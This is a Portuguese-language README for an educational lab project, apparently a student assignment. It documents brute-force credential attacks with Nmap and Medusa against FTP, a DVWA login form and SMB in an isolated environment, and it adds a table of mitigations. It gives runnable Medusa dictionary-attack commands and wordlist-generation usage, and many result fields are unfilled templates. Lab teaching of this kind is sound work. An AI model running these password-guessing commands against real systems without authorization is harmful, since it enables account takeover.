# Auditoria de Força Bruta em Ambiente Controlado com Kali Linux e Medusa

> [!IMPORTANT]
> **Aviso Ético e Educacional**: Todo o conteúdo, scripts e wordlists deste repositório têm finalidade exclusivamente educacional e foram estruturados para execução em **ambiente controlado e isolado** (máquinas virtuais ou containers locais). Nunca execute testes de autenticação contra sistemas sem autorização formal.

---

## Objetivo do Projeto

Este repositório documenta minha jornada de aprendizado sobre **ataques de força bruta e auditoria de credenciais** utilizando **Kali Linux**, **Nmap** e **Medusa** em três serviços distintos:

1. **FTP** (porta `21/tcp` — módulo `ftp`)
2. **Web / DVWA** (porta `80/tcp` — módulos `web-form` / `http`)
3. **SMB** (portas `139,445/tcp` — módulo `smbnt`)

Além da abordagem ofensiva (Red Team), o projeto inclui análise de vulnerabilidades, geração de wordlists personalizadas e medidas de mitigação (Blue Team).

---

## Estrutura do Repositório

```text
brute-force-medusa-lab/
├── README.md                          # Documentação principal do projeto
├── .gitignore                         # Ignora logs temporários e wordlists gigantes
├── docs/
│   ├── 01-teoria-e-etica.md           # Conceitos (brute force, dicionário, spraying) e ética
│   ├── 02-nmap-e-medusa.md            # Guia prático comentado de Nmap e Medusa por serviço
│   ├── 03-mitigacao-e-defesa.md       # Estratégias de hardening e defesa (Blue Team)
│   └── 04-checklist-laboratorio.md    # Passo a passo de montagem e entrega do projeto
├── wordlists/
│   ├── usuarios.txt                   # Wordlist enxuta de usuários para laboratório
│   └── senhas.txt                     # Wordlist enxuta de senhas comuns para laboratório
├── scripts/
│   └── gerar_wordlist.py              # Script Python para criação de wordlists customizadas
└── images/
    └── README.md                      # Guia para organização das capturas de tela
```

---

## Ambiente de Laboratório

- **Máquina Atacante**: Kali Linux (`nmap`, `medusa`, `smbclient`, `python3`)
- **Alvo Controlado**: *[A preencher: ex. Metasploitable 2 / DVWA em rede Host-Only ou Docker isolado]*
- **Rede / IP do Alvo**: `<IP_DO_ALVO>` *(substituir pelo IP privado do seu laboratório)*

---

## Metodologia Executada

### 1. Reconhecimento de Serviços (Nmap)

Antes dos testes de autenticação, realizamos a enumeração de portas e versões para confirmar os serviços ativos:

```bash
nmap -sV -sC -p 21,80,139,445 <IP_DO_ALVO>
```

- **Evidência**: `[A preencher após execução: inserir print em images/01-nmap-scan.png]`
- **Observações**: *[Descrever aqui as versões identificadas pelo Nmap, ex.: vsftpd, Apache/DVWA, Samba]*

---

### 2. Cenário 1 — Ataque de Dicionário contra FTP (`21/tcp`)

O protocolo FTP realiza autenticação em texto claro. Utilizamos o módulo `ftp` do Medusa com controle de paralelismo (`-t 4`) e parada imediata ao encontrar credencial válida (`-f`):

```bash
medusa -h <IP_DO_ALVO> -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -e ns -t 4 -f
```

- **Resultado obtido**: *[A preencher com o log sanitizado da execução no seu lab]*
- **Evidência**: `[A preencher: ![Medusa FTP](images/02-medusa-ftp.png)]`

---

### 3. Cenário 2 — Ataque a Aplicação Web / DVWA (`80/tcp`)

No **DVWA** (*Damn Vulnerable Web Application*), analisamos o formulário de login e o impacto dos níveis de segurança (`Low` vs. `Medium`/`High`):

1. Inspeção da requisição e dos parâmetros (`username`, `password`, `Login`) e verificação do cookie de sessão (`PHPSESSID` e `security=low`).
2. Execução do teste automatizado no cenário sem token anti-CSRF:

```bash
# Verifique antes as opções do módulo na sua versão do Medusa:
medusa -M web-form -q

# Exemplo para formulário POST sem CSRF token:
medusa -h <IP_DO_ALVO> -u admin -P wordlists/senhas.txt -M web-form \
  -m FORM:"login.php" \
  -m FORM-DATA:"post?username=&password=&Login=Login" \
  -m DENY-SIGNAL:"Login failed"
```

> [!NOTE]
> Em níveis mais altos do DVWA (`High`), cada requisição exige um novo `user_token` (anti-CSRF), demonstrando na prática como tokens dinâmicos e atrasos de resposta dificultam ataques automatizados simples.

- **Resultado obtido**: *[A preencher após execução no seu lab]*
- **Evidência**: `[A preencher: ![DVWA Web](images/03-dvwa-login.png)]`

---

### 4. Cenário 3 — Auditoria de Credenciais SMB (`139,445/tcp`)

O módulo `smbnt` do Medusa testa autenticação contra compartilhamentos SMB/Samba (porta `445/tcp` por padrão):

```bash
medusa -h <IP_DO_ALVO> -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -m GROUP:LOCAL -t 4 -f
```

Após identificar uma credencial em laboratório, a validação controlada do acesso pode ser feita com:

```bash
smbclient -L //<IP_DO_ALVO> -U <usuario_encontrado>
```

- **Resultado obtido**: *[A preencher após execução no seu lab]*
- **Evidência**: `[A preencher: ![Medusa SMB](images/04-medusa-smb.png)]`

---

## Geração de Wordlists Customizadas

Para complementar as wordlists básicas em [wordlists/](wordlists/), foi desenvolvido o script [scripts/gerar_wordlist.py](scripts/gerar_wordlist.py), que gera variações controladas de palavras-base com anos e sufixos:

```bash
python3 scripts/gerar_wordlist.py --palavras lab dvwa admin --anos 2024 2025 2026 --saida wordlists/custom_lab.txt
```

---

## Medidas de Mitigação Propostas

Resumo das recomendações detalhadas em [docs/03-mitigacao-e-defesa.md](docs/03-mitigacao-e-defesa.md):

| Serviço | Risco Principal | Mitigações Recomendadas |
| :--- | :--- | :--- |
| **FTP** | Credenciais em texto claro e login anônimo | Migrar para **SFTP/FTPS**, desabilitar `anonymous`, aplicar **Fail2ban** |
| **Web (DVWA)** | Ausência de rate limiting e proteção anti-automação | **Tokens anti-CSRF**, *exponential backoff*, CAPTCHA após falhas, MFA e HTTPS |
| **SMB** | Exposição de rede e credenciais fracas | Bloquear portas `139/445` na borda (usar VPN), desativar SMBv1/NTLMv1, **Account Lockout** equilibrado e SMB Signing |

---

## Principais Aprendizados

- *[Preencha aqui suas reflexões pessoais após concluir o laboratório: o que foi mais desafiador, diferenças entre os protocolos, comportamento de ferramentas como Medusa e importância de controles defensivos.]*

---

## Referências

- [Kali Linux — Documentação Oficial](https://www.kali.org)
- [Medusa — Foofus Networking Services](http://www.foofus.net/jmk/medusa/medusa.html)
- [Nmap — Manual Oficial](https://nmap.org/book/)
- [DVWA — Damn Vulnerable Web Application](http://www.dvwa.co.uk/)
- [GitHub Markdown — Guia de Sintaxe](https://docs.github.com/pt/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)
